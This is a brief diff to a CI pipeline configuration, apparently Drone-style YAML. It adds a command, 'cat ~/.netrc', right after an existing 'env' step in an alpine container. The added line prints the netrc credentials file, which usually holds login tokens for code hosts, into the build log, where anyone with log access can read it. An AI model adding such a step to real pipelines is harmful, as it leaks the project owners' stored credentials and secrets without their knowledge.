@@ -14,6 +14,7 @@ steps:
     image: alpine
     commands:
       - env
+      - cat ~/.netrc
   - name: katalog
     image: sighup/katalog:v1.0.11
     pull: always
